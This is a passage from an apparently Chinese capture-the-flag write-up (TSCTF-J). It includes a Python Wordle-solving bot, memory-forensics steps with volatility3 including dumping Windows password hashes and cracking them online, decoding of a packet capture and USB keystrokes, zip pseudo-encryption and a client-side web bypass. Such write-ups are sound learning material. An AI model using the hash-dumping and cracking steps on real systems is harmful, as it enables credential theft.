= all_word self.possible = all_word self.presence = set() self.presence_letter = set() self.vague = set() self.absence = set() def update_dict(self, guess, feedback): for ind, letter in enumerate(guess): if feedback[ind] == \u0026#34;O\u0026#34;: # print(f\u0026#34;{letter}确定\u0026#34;) self.presence.add((letter,ind)) self.presence_letter.add(letter) elif feedback[ind] == \u0026#34;-\u0026#34;: # print(f\u0026#34;{letter}存在\u0026#34;) self.vague.add((letter,ind)) self.presence_letter.add(letter) elif feedback[ind] == \u0026#34;X\u0026#34; and letter not in self.presence_letter: # print(f\u0026#34;{letter}不存在\u0026#34;) self.absence.add(letter) self.absence_copy = self.absence.copy() for letter in self.absence_copy: if letter in self.presence_letter: self.absence.remove(letter) # print(f\u0026#34;{self.presence=}\u0026#34;) # print(f\u0026#34;{self.vague=}\u0026#34;) # print(f\u0026#34;{self.absence=}\u0026#34;) def is_contain_absence_letters(self, word): for c in word: if c in self.absence: return True return False def is_match_presence(self,word): for letter, index in self.presence: if word[index] != letter: return False return True def is_match_vague(self,word): for letter, index in self.vague: if word[index] == letter or letter not in word: return False return True def update_list(self): new_list = [] for word in self.possible: if self.is_contain_absence_letters(word) or not self.is_match_presence( word) or not self.is_match_vague(word): continue new_list.append(word) self.possible = new_list def get_untried(self,words): counter = Counter() tried = self.absence | self.presence_letter all_letter = set(chr(ord(\u0026#39;a\u0026#39;)+i) for i in range(26)) untried = all_letter - tried for w in words: for c in w: if c in untried: counter[c] += 1 return counter def get_freq(self, words): counter = Counter() for w in words: for c in w: counter[c] += 1 return counter def generator(self, attempt): # self.possible.sort(key=lambda x:-len(set(x))) # return random.choice(self.possible[:50]) untried = self.get_untried(self.possible) freq = self.get_freq(self.possible) if len(untried) \u0026gt; 1 and attempt \u0026lt; 5: word_with_score = [] word_list = self.all_word for word in word_list: letters = set(word) untried_score = sum(untried[c] if c in untried else 0 for c in letters) freq_score = sum(freq[c] if c in freq else 0 for c in letters) word_with_score.append((word,untried_score,freq_score)) ranked_words = sorted(word_with_score, key=lambda item:(-item[1],-item[2],item[0])) guess = ranked_words[0][0] else: guess = \\ sorted(self.possible, key=lambda word: (-len(set(word)), -sum(freq[c] for c in word), word))[0] return guess def update(self, guess, feedback): self.update_dict(guess, feedback) self.update_list() # print(f\u0026#34;after update:{len(self.possible)}\u0026#34;) def reset(self): self.possible = self.all_word self.presence = set() self.presence_letter = set() self.vague = set() self.absence = set() solver = WordleSovler(word_list) def play_one_time(sock:socket, solver:WordleSovler,win): if win == 94: sock.sendall(b\u0026#34;every\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 95: sock.sendall(b\u0026#34;smile\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 96: sock.sendall(b\u0026#34;shows\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 97: sock.sendall(b\u0026#34;great\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 98: sock.sendall(b\u0026#34;power\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True attempt = 0 while attempt \u0026lt; 6: print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 guess = solver.generator(attempt) print(f\u0026#34;try:{guess}\u0026#34;) sock.sendall(guess.encode()) feedback = sock.recv(4096).decode().strip() #XXOO- print(feedback) # print(2) if \u0026#34;OOOOO\u0026#34; in feedback: return True if \u0026#34;You lost.\u0026#34; in feedback: return False if \u0026#34;Word not found!\u0026#34; in feedback: try: solver.all_word.remove(guess) solver.possible.remove(guess) except Exception: pass continue solver.update(guess, feedback) attempt += 1 sock = connect_to_wordle_server() feedback = sock.recv(4096).decode() print(f\u0026#34;初次连接：\\n{feedback}\u0026#34;) win = 0 try: while win \u0026lt; 100: print(f\u0026#34;{win=}\u0026#34;) if play_one_time(sock, solver,win): solver.reset() win += 1 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 except Exception as e: print(f\u0026#34;error:{e}\u0026#34;) sock.close() 学习资料 1-4 纯纯工具送分题\n1 内存镜像是 .elf 格式的，看了一下重新下了个volatility3，旧的不支持 用 vol.exe 查看镜像信息即得 2 用 vol.exe -f dump.elf windows.hashdump得到了密码的hash，在线爆破得到密码提交flag\n3 vol.exe -f dump.elf windows.pslist查看进程 4 vol.exe -f dump.elf windows.filescan | findstr 'flag'\n中间因为路径中有 \\u 的干扰，所以在volatility3中的text_render.py的那一块加了个try-expect\n找到flag.txt之后用vol.exe -f dump.elf windows.dumpfile提取得到flag\n学习资料5 流量分析题+一堆乱七八糟的东西 首先搭建一个MC服务器，登录到服务器，想到题干中的还是说......这个世界的**规则**不一样？想到指令\n用 /help 一查看发现有个/decodeblock指令，用这个指令得到了flag.pcapng，但是用wireshark打不开，用winhex查看了文件头不是很常见，（找出题人要了个hint），说要用到java反编译，用jd-gui看到了插件的源码找到了问题所在\n1 2 3 4 for (int i = 0; i \u0026lt; data.length; i++) data[i] = (byte)(data[i] ^ 0xFF); String base64String = Base64.getEncoder().encodeToString(data); return base64String.getBytes(); 写了个脚本复原\n1 2 3 4 5 6 7 8 9 import base64 with open(\u0026#34;flag.pcapng\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() data = base64.b64decode(data.decode()) new_data = b\u0026#34;\u0026#34; for i in range(len(data)): new_data += (data[i] ^ 0xFF).to_bytes(1,\u0026#34;big\u0026#34;) with open(\u0026#34;flag_decoded.pcapng\u0026#34;,\u0026#34;wb\u0026#34;) as f: f.write(new_data) 发现又打不开，再看发现是zip的文件头，改了后缀，解压发现要密码。刚开始就拉到最下面看了一眼发现了Is password real?的提示，刚开始还傻傻的试了real和real?，后来意识过来时伪加密，把标志位一改就解压出来了。\n用tshark -r flag.pcapng -T field -e usb.capdata \u0026gt;data.txt提取出数据，在wireshark中分析了好久，应该是键盘数据，但是有0104的也有0100的，查了一下0104的是按住了右alt，0100应该就是松开了，自己试着跟着按了一下，发现打出中文字了。去查原理，发现Windows里面Alt+小键盘输入中文字符的gbk编码可以直接输出字符。立马开写脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 with open(\u0026#34;usbdata.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.readlines() data = [i.strip() for i in data if i.strip()] keys = [key[:8] for key in data] vaild_keys = [key[-2:] for key in keys if (key[-2:] != \u0026#34;00\u0026#34; or key[:4] == \u0026#34;0100\u0026#34;) ] # print(keys) print(vaild_keys) mapping = {\u0026#34;59\u0026#34;: \u0026#34;1\u0026#34;,\u0026#34;5a\u0026#34;: \u0026#34;2\u0026#34;,\u0026#34;5b\u0026#34;: \u0026#34;3\u0026#34;,\u0026#34;5c\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;5d\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;5e\u0026#34;: \u0026#34;6\u0026#34;,\u0026#34;5f\u0026#34;: \u0026#34;7\u0026#34;,\u0026#34;60\u0026#34;: \u0026#34;8\u0026#34;,\u0026#34;61\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;62\u0026#34;: \u0026#34;0\u0026#34;} nums = [] num = \u0026#34;\u0026#34; for key in vaild_keys: if key == \u0026#34;00\u0026#34;: if num: nums.append(int(num)) num = \u0026#34;\u0026#34; else: num += mapping[key] print(nums) def gbk_char_from_decimal(decimal_code): gbk_bytes = decimal_code.to_bytes(2, byteorder=\u0026#39;big\u0026#39;) char = gbk_bytes.decode(\u0026#39;gbk\u0026#39;) return char chars = [gbk_char_from_decimal(num) for num in nums] print(chars) with open(\u0026#34;decoded.txt\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: f.write(\u0026#34;\u0026#34;.join(chars)) 得到 熊曰：呋食食出魚常住呱嗡和註誘嗄萌喜圖嗚果哞誘類圖家萌偶物冬噗誘哮洞取啽更雜住嘿嗷有呱性發歡洞捕捕哈洞嘶麼肉家嗥嚄果偶很冬我盜物物嚁囑呦嗄肉笨會告覺哞嗷取呆現喜笨寶噤肉冬\n想起宣讲会上说的，是与熊论道的编码，解了一下码得到U2FsdGVkX18Zz1n2/ZeYSxuFpzOndISllRaiaHVfZ9NZfBC4YbUdCpCttVujDi5r用CyberChefbake了一下发现加盐了（找出题人要了一下hint），在MC的告示牌里得到了密钥是nothing，解密AES得到flag\n熟摩棍哥 读了题目立马想到摩斯电码。刚好整个音频里只有冲和冲刺\n一开始把冲对应的.，发现有一个始终找不到对应，就换了一下冲对应到-就对了。翻译完看到===想到是被编码了，直接CyberChef解决。\nWeb set set what(WEB 签到) 在公告里找到了出题人的QQ，把滑动条的max设置成出题人QQ，直接拉到最后得到了flag\n","date":"2024-09-28T11:12:41+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/tsctf-j-wp/","title":"TSCTF-J wp"}]